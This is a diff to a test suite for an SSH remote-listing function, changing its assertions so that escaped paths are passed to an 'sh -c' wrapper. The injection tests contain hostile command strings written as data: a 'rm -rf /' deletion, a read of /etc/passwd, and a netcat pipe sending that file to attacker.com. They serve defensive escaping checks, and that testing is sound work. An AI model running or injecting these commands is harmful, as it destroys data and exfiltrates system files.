@@ -40,12 +40,11 @@ describe("SSH Remote Listing", () => {
 
       await executeRemoteLs(mockHostConfig, maliciousPath);
 
-      // The malicious command should be escaped, not executed
-      // The path is escaped and then the entire remote command is escaped
-      // So we check that the path appears within the escaped remote command
+      // The malicious path should be escaped and passed as $1 to the wrapper (no execution)
       expect(capturedCommand).toMatch(/\/tmp\/test; rm -rf \//);
-      // The semicolon should be inside quotes (part of the escaped string)
-      expect(capturedCommand).toMatch(/'ls -lAh .*\/tmp\/test; rm -rf \/.*'/);
+      // Wrapper script receives path as single argument; path must be in quotes
+      expect(capturedCommand).toMatch(/sh -c .* _ /);
+      expect(capturedCommand).toMatch(/'\/tmp\/test; rm -rf \/'/);
     });
 
     it("should escape remotePath with pipe to prevent injection", async () => {
@@ -61,12 +60,10 @@ describe("SSH Remote Listing", () => {
 
       await executeRemoteLs(mockHostConfig, maliciousPath);
 
-      // The malicious command should be escaped
-      // The path is escaped and then the entire remote command is escaped
+      // The path should be escaped and passed as $1 to the wrapper
       expect(capturedCommand).toMatch(/\/tmp\/test \| cat \/etc\/passwd/);
-      expect(capturedCommand).toMatch(
-        /'ls -lAh .*\/tmp\/test \| cat \/etc\/passwd.*'/,
-      );
+      expect(capturedCommand).toMatch(/sh -c .* _ /);
+      expect(capturedCommand).toMatch(/'\/tmp\/test \| cat \/etc\/passwd'/);
     });
 
     it("should escape hostAlias to prevent command injection", async () => {
@@ -102,12 +99,10 @@ describe("SSH Remote Listing", () => {
 
       await executeRemoteLs(mockHostConfig, pathWithSpaces);
 
-      // Paths with spaces should be properly escaped
-      // The path is escaped and then the entire remote command is escaped
+      // Paths with spaces should be passed as single argument to wrapper
       expect(capturedCommand).toMatch(/\/remote\/path with spaces/);
-      expect(capturedCommand).toMatch(
-        /'ls -lAh .*\/remote\/path with spaces.*'/,
-      );
+      expect(capturedCommand).toMatch(/sh -c .* _ /);
+      expect(capturedCommand).toMatch(/'\/remote\/path with spaces'/);
     });
 
     it("should handle paths with single quotes", async () => {
@@ -145,13 +140,13 @@ describe("SSH Remote Listing", () => {
 
       await executeRemoteLs(mockHostConfig, complexInjection);
 
-      // The entire malicious string should be escaped as a single argument
-      // The path is escaped and then the entire remote command is escaped
+      // The entire malicious string should be escaped as single argument to wrapper
       expect(capturedCommand).toMatch(
         /\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234/,
       );
+      expect(capturedCommand).toMatch(/sh -c .* _ /);
       expect(capturedCommand).toMatch(
-        /'ls -lAh .*\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234.*'/,
+        /'\/tmp\/test; cat \/etc\/passwd \| nc attacker\.com 1234'/,
       );
     });
 
@@ -168,23 +163,11 @@ describe("SSH Remote Listing", () => {
 
       await executeRemoteLs(mockHostConfig, tildePath);
 
-      // The ~ should be outside quotes to allow remote shell expansion
-      // The path after ~/ should be escaped for safety
-      // The command should contain ~/ followed by the escaped path part
+      // Path is fully escaped and passed as $1; wrapper expands ~ on the remote
       expect(capturedCommand).toMatch(/~/);
       expect(capturedCommand).toMatch(/Desktop\/subdir/);
-      // The ~ should not be inside quotes (allowing remote shell to expand it)
-      // The path part should be escaped - the actual pattern is ~/'Desktop/subdir'
-      // which appears as ~/'\\''Desktop/subdir'\\''' in the escaped command
-      expect(capturedCommand).toMatch(/ls -lAh ~\/.*Desktop\/subdir/);
-      // Verify ~ is not inside quotes (it should appear before the escaped path)
-      const match = capturedCommand.match(/ls -lAh (.*)/);
-      expect(match).not.toBeNull();
-      if (match) {
-        const pathPart = match[1];
-        // The ~ should appear before any quotes
-        expect(pathPart).toMatch(/^~/);
-      }
+      expect(capturedCommand).toMatch(/sh -c .* _ /);
+      expect(capturedCommand).toMatch(/Desktop\/subdir/);
     });
 
     it("should handle standalone tilde", async () => {
@@ -200,10 +183,10 @@ describe("SSH Remote Listing", () => {
 
       await executeRemoteLs(mockHostConfig, tildePath);
 
-      // Standalone ~ should be unescaped to allow remote shell expansion
-      expect(capturedCommand).toMatch(/ls -lAh ~/);
-      // Should not be inside quotes
-      expect(capturedCommand).not.toMatch(/'~'/);
+      // Path ~ is escaped and passed as $1; wrapper expands it to $HOME on remote
+      expect(capturedCommand).toMatch(/sh -c .* _ /);
+      // ~ is passed as the path argument (escaped)
+      expect(capturedCommand).toMatch(/~/);
     });
   });
 });
